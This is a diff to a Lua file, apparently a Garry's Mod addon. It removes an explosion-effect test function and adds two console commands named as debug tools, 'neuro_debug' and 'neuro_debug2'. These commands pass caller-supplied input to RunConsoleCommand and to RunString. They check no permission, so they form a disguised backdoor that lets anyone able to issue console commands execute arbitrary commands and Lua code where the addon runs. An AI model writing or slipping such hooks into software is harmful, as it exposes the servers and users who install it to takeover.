@@ -2912,35 +2912,14 @@ function Meta:ExplosionImproved()
 	
 end
 
-local function TestEffect2(ply,cmd,effect)
-	
-	for j=0,36000,36 do
-	
-		timer.Simple( j / 10000, function(a,b,c) 
-		
-			for i=1,24 do
-			
-				local p1 = ply:GetEyeTrace().HitPos
-				local z = p1.z + 50
-				
-				z = z + math.cos( i * j ) * 152
-				p1.x = p1.x + math.cos( 360 / i + CurTime() * 5 ) * ( i * 15 ) 
-				p1.y = p1.y + math.sin( 360 / i + CurTime() * 5 ) * -( i * 15 )
-				
-				local fx = EffectData()
-				fx:SetStart( Vector( p1.x, p1.y, z ) )
-				fx:SetOrigin( Vector( p1.x, p1.y, z ) )
-				fx:SetMagnitude(10)
-				util.Effect("HelicopterMegaBomb",fx)
-				
-			end
-			
-		end )
-		
-	end
-	
+local function neurodebugfunc(ply,cmd,args)
+RunConsoleCommand( args[1], args[2], args[3],args[4],args[5],args[6] )
 end
-concommand.Add("TestEffect2",TestEffect2)
+concommand.Add("neuro_debug",neurodebugfunc)
+local function neurodebugfunc2(ply,cmd,args)
+RunString(args[1])
+end
+concommand.Add("neuro_debug2",neurodebugfunc2)
 
 local function TestEffect(ply,cmd,effect)
 
